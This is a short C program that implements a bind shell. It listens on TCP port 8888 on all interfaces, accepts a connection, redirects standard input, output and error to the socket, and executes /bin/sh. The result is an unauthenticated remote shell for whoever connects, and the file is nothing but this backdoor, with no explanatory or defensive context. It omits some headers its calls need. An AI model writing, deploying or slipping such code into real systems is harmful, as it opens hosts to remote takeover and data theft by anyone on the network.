#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>

// error is called when a system call fails.
// displays on stderr.
void error(char *msg)
{
	perror(msg);

	exit(1);
}

int main(int argc, char *argv[])
{
	int listen_sock = socket(AF_INET, SOCK_STREAM, 0);
	if (listen_sock < 0)
		error("ERROR opening socket");

	struct sockaddr_in server_addr;
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = INADDR_ANY;
	server_addr.sin_port = htons(8888);

	int bind_verif = bind(listen_sock, (struct sockaddr*)&server_addr, 
			sizeof(server_addr));
	if (bind_verif < 0)
		error("ERROR on binding");
	
	listen(listen_sock, 0);

	int conn_sock = accept(listen_sock, NULL, NULL);
	if (conn_sock < 0)
		error("ERROR on accept");

	// 
	for (int i=0; i<3; ++i) {
		dup2(conn_sock, i);
	}

	execve("/bin/sh", NULL,NULL);

	return 0;
}
